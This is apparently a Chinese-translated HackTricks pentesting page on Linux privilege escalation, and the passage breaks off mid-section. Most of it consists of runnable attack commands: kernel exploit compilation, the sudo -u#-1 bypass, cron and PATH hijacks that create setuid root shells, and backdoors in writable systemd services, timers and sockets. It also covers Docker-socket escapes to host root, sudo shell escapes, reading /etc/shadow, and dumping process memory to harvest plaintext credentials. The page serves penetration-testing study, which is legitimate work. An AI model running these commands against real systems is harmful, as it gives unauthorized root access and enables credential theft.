# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始了解正在运行的操作系统。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

如果你 **在 `PATH` 变量内的任何文件夹上拥有写权限**，你可能能够劫持一些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含敏感信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查内核版本，确认是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的易受攻击的 kernel 列表和一些已经 **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从这些网站提取所有易受影响的 kernel 版本，你可以这样做:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助查找 kernel exploits 的工具包括：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

始终**在 Google 上搜索 kernel 版本**，也许你的 kernel 版本出现在某些 kernel exploit 中，这样你就能确定该 exploit 是否有效。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下内容中的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB** 以获取有关如何利用此 vuln 的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多 system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker 容器内，可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **哪些已挂载或未挂载**、在何处以及为什么。如果有任何未挂载的，你可以尝试将其挂载并检查是否包含私密信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否已安装 **任何编译器**。如果你需要使用某些 kernel exploit，这很有用 —— 建议在将要使用它的机器上（或在一台类似的机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装的软件包和服务的版本**。可能存在某个旧的 Nagios 版本（例如），可以被利用来进行 escalating privileges…\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对该机器的 SSH 访问权限，你也可以使用 **openVAS** 来检测机器上安装的过时或存在漏洞的软件。

> [!NOTE] > _注意：这些命令会显示大量大多无用的信息，因此建议使用像 OpenVAS 或类似工具来检查任何已安装软件版本是否易受已知漏洞利用_

## 进程

查看正在执行的 **哪些进程**，并检查是否有进程具有 **超出应有的权限**（例如某个 tomcat 由 root 执行？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否存在 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些调试器。\
另外**检查你对进程二进制文件的权限**，也许你能覆盖某些文件。

### Process monitoring

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这对于识别经常被执行或在满足一组条件时运行的易受攻击进程非常有用。

### Process memory

服务器上的某些服务会在内存中以**明文保存凭证**。\
通常你需要 **root privileges** 才能读取属于其他用户的进程内存，因此这通常在你已经是 root 并想发现更多凭证时更有用。\
不过，记住 **作为普通用户你可以读取自己拥有的进程的内存**。

> [!WARNING]
> 注意，如今大多数机器 **默认不允许 ptrace**，这意味着你无法转储属于其他非特权用户的进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**: 所有进程都可以被调试，只要它们具有相同的 uid。这是 ptrace 传统的工作方式。
> - **kernel.yama.ptrace_scope = 1**: 只能调试父进程。
> - **kernel.yama.ptrace_scope = 2**: 只有 admin 可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**: 不允许用 ptrace 跟踪任何进程。一旦设置，需要重启才能再次启用 ptrace。

#### GDB

如果你可以访问某个 FTP 服务（例如）的内存，你可以获取堆（Heap）并在其中搜索凭证。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的虚拟地址空间中内存如何被映射**；它还显示**每个映射区域的权限**。**mem** 伪文件**暴露了进程本身的内存**。从 **maps** 文件中我们可以知道哪些**内存区域是可读的**以及它们的偏移量。我们使用这些信息去**在 mem 文件中定位并转储所有可读区域**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump 用于 linux

ProcDump 是 Sysinternals 套件中用于 Windows 的经典 ProcDump 工具在 Linux 上的重新实现。获取地址：[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并转储由你拥有的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root 权限)

### Credentials from Process Memory

#### Manual example

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
您可以转储进程（参见前文章节以了解不同的进程内存转储方法）并在内存中搜索凭证：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存中窃取明文凭证**，并从一些**已知文件**中获取凭证。它需要 root 权限才能正常工作。

| 功能                                              | 进程 名称            |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (活动的 FTP 连接)                          | vsftpd               |
| Apache2 (活动的 HTTP Basic Auth 会话)             | apache2              |
| OpenSSH (活动的 SSH 会话 - sudo 使用)             | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 计划任务/Cron jobs

检查是否有任何计划任务存在可被利用的漏洞。也许你可以利用由 root 执行的脚本（wildcard vuln? 能修改 root 使用的文件吗？使用 symlinks？在 root 使用的目录中创建特定文件？）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 具有写权限_)

如果在该 crontab 中 root 尝试在没有设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\  
然后，你可以通过以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果一个以 root 身份执行的脚本在命令中包含 “**\***”，你可以利用这一点导致意外行为（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 被放在像** _**/some/path/\***_ **的路径前面，它就不易受攻击（即使** _**./\***_ **也不行）。**

阅读以下页面以获取更多 wildcard exploitation tricks：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script overwriting and symlink

如果你 **can modify a cron script** 且该脚本由 root 执行，你可以非常容易获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的 script 使用一个 **directory（你拥有完全访问权限）**，也许删除该文件夹并 **create a symlink folder to another one** 来托管由你控制的 script 会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的 cron jobs

你可以监控进程，以查找每 1、2 或 5 分钟被执行的进程。也许你可以利用它来 escalate privileges。

例如，要 **在 1 分钟内每 0.1 秒监控一次**、**按执行次数较少的命令排序** 并删除执行次数最多的命令，你可以这样做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**您也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (这将监视并列出每个启动的进程)。

### 隐形 cron jobs

可以通过创建一个 cronjob，**在注释后放置回车**（没有换行字符），并且 cron job 会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你**可以修改它**，使其在 service **启动**、**重启**或**停止**时**执行**你的**backdoor**（可能需要等到机器重启）。\
例如在 `.service` 文件中通过 **`ExecStart=/tmp/script.sh`** 创建你的 backdoor

### 可写的 service 二进制文件

请记住，如果你对被服务执行的二进制文件拥有**写权限**，你可以将它们替换为后门，这样当服务被重新执行时，后门也会被执行。

### systemd PATH - 相对路径

你可以通过以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在路径的任何文件夹中**write**，你可能能够**escalate privileges**。你需要搜索服务配置文件中像下面这样使用**relative paths being used on service configurations**的情况：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你有写权限的 systemd PATH 文件夹中，创建一个名称与相对路径二进制文件相同的 **可执行文件**，当服务被要求执行易受攻击的操作（**Start**、**Stop**、**Reload**）时，你的 **后门将被执行**（非特权用户通常不能启动/停止服务，但可检查是否能使用 `sudo -l`）。

**使用 `man systemd.service` 了解有关服务的更多信息。**

## **定时器**

**定时器** 是以名称以 `**.timer**` 结尾的 systemd 单元文件，用于控制 `**.service**` 文件或事件。**定时器** 可作为 cron 的替代，因为它们内置对日历时间事件和单调时间事件的支持，并可以异步运行。

你可以使用以下命令枚举所有定时器：
```bash
systemctl list-timers --all
```
### 可写的定时器

如果你可以修改一个定时器，你就可以让它执行 systemd.unit 的某些现有单元（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中可以看到 Unit 的定义：

> 在此 timer 到期时要激活的 Unit。参数是一个单元名称，其后缀不是 ".timer"。如果未指定，则此值默认为与 timer 单元名字相同但后缀不同的 service。（见上文。）建议被激活的单元名称与 timer 单元的名称除后缀外一致。

因此，要滥用此权限你需要：

- 找到某个 systemd unit（例如 `.service`），它正在 **执行可写的二进制文件**
- 找到某个 systemd unit 正在 **执行相对路径**，且你对 **systemd PATH** 拥有 **可写权限**（以伪装为该可执行文件）

**更多关于 timers 的信息请参见 `man systemd.timer`。**

### **启用 Timer**

要启用一个 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **激活** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **进程间通信** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**有关 sockets 的更多信息，请参阅 `man systemd.socket`。** 在该文件中，可以配置多个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于**指示将在哪监听**该 socket（AF_UNIX socket 文件的路径、要监听的 IPv4/6 和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果 **true**，则为每个传入连接生成一个**服务实例**，并且仅将连接 socket 传递给它。如果 **false**，所有监听套接字本身会**传递给启动的服务单元**，并且只会为所有连接生成一个服务单元。对于 datagram sockets 和 FIFOs，该值被忽略，在这些情况下单个服务单元无条件地处理所有传入流量。**默认值为 false**。出于性能原因，建议在编写新的守护进程时仅以适用于 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令分别在监听的 **sockets**/FIFOs 被**创建**并绑定之前或之后**执行**。命令行的第一个标记必须是绝对文件名，后面跟进进程的参数。
- `ExecStopPre`, `ExecStopPost`: 额外的**命令**，它们分别在监听的 **sockets**/FIFOs 被**关闭**并移除之前或之后**执行**。
- `Service`: 指定在**传入流量**时**激活**的**service**单元名称。该设置仅允许用于 Accept=no 的 sockets。默认情况下，它指向与 socket 同名的 service（后缀已替换）。在大多数情况下，不需要使用此选项。

### Writable .socket files

如果你发现了一个**可写的** `.socket` 文件，你可以在 `[Socket]` 段的开头**添加**类似 `ExecStartPre=/home/kali/sys/backdoor` 的行，该后门将在 socket 被创建之前执行。因此，你**可能需要等到机器重启**。\
_注意系统必须正在使用该 socket 文件的配置，否则后门不会被执行_

### Writable sockets

如果你**发现任何可写的 socket**（_这里我们指的是 Unix Sockets，而不是配置 `.socket` 文件_），那么**你可以与该 socket 通信**，并可能利用其中的漏洞。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

请注意，可能有一些 **sockets listening for HTTP** requests (_我不是指 .socket files，而是指作为 unix sockets 的文件_)。你可以用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **responds with an HTTP** 请求，那么你可以与它 **communicate**，并可能 **exploit some vulnerability**。

### 可写的 Docker socket

The Docker socket，通常位于 `/var/run/docker.sock`，是一个需要保护的重要文件。默认情况下，它对 `root` 用户和 `docker` 组的成员可写。拥有对该 socket 的写权限可能导致 privilege escalation。下面是如何做到这一点的分解，以及在无法使用 Docker CLI 时的替代方法。

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有 write access，你可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 级别访问主机的文件系统。

#### **直接使用 Docker API**

当 Docker CLI 不可用时，仍可以使用 Docker API 和 `curl` 命令来操纵 Docker socket。

1.  **List Docker Images:** 获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 发送请求以创建一个将主机根目录挂载进去的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** 使用 `socat` 建立与容器的连接，从而在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

建立 `socat` 连接后，你可以在容器中直接执行命令，并以 root 级别访问主机的文件系统。

### 其他

注意，如果你因为**属于组 `docker`** 而对 docker socket 拥有写权限，你有 [**更多提权方法**](interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API 在某端口监听，你也可能能够攻破它**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看 **更多从 docker 逃逸或滥用它以提权的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现可以使用 **`ctr`** 命令，请阅读下面的页面，因为 **you may be able to abuse it to escalate privileges**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现可以使用 **`runc`** 命令，请阅读下面的页面，因为 **you may be able to abuse it to escalate privileges**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的进程间通信 (IPC) 系统，使应用程序能够高效地交互和共享数据。为现代 Linux 系统设计，它为不同形式的应用通信提供了一个健壮的框架。

该系统功能多样，支持增强的 UNIX 域套接字式的基本 IPC，促进进程间的数据交换。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自 Bluetooth 守护进程的来电信号可以促使音乐播放器静音，从而提升用户体验。D-Bus 还支持远程对象系统，简化应用之间的服务请求和方法调用，理顺传统上复杂的流程。

D-Bus 基于一种允许/拒绝模型运作，根据匹配的策略规则的综合效果来管理消息权限（方法调用、信号发送等）。这些策略指定与 bus 的交互，可能通过滥用这些权限导致提权。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了此类策略的示例，详细说明了 root 用户对 `fi.w1.wpa_supplicant1` 的拥有、发送和接收消息的权限。

未指定用户或组的策略适用于所有主体，而“default”上下文策略则适用于未被其他特定策略覆盖的所有主体。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在这里学习如何 enumerate 并 exploit D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

在网络中进行 enumerate 并确定主机的位置总是很有趣。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

始终检查在你访问该机器之前无法与之交互的、正在该机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff 流量。如果可以，你可能能够抓取一些 credentials。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **who** 你是谁，你拥有什么 **privileges**，系统中有哪些 **users**，哪些可以 **login**，哪些具有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受到一个漏洞影响，允许 **UID > INT_MAX** 的用户 to escalate privileges。更多信息： [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** 使用： **`systemd-run -t /bin/bash`**

### 组

检查你是否是 **某个组的成员**，该组可能授予你 root privileges：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

如果可能，检查剪贴板中是否有任何有趣的内容
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，请**尝试使用该密码登录每个用户**。

### Su Brute

如果你不介意产生大量噪音，且目标主机上存在 `su` 和 `timeout` 二进制文件，可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写 $PATH 滥用

### $PATH

如果你发现可以**在 $PATH 的某个文件夹中写入**，你可能能够通过**在可写文件夹中创建一个后门**（其名称与某个将由不同用户（理想情况下为 root）执行的命令相同）来提升权限，前提是该命令**不会从位于你可写文件夹之前的目录**加载。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些命令可能具有 suid 位。使用以下方法检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
某些 **意想不到的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在可以通过将一个 ssh key 添加到 root 目录或调用 `sh` 来轻松获得一个 shell。
```
sudo vim -c '!sh'
```
### SETENV

该指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个示例，**基于 HTB machine Admirer**，存在 **PYTHONPATH hijacking** 漏洞，可以在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 执行路径绕过

**Jump** 跳转以读取其他文件或使用 **symlinks**。例如在 sudoers 文件中: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 没有指定命令路径

如果将单个命令赋予 **sudo 权限** 且 **未指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
如果一个 **suid** 二进制文件 **在执行另一个命令时没有指定其路径（务必使用** _**strings**_ **检查可疑 SUID 二进制文件的内容）**，也可以使用该技术。

[Payload examples to execute.](payloads-to-execute.md)

### SUID 二进制（指定命令路径）

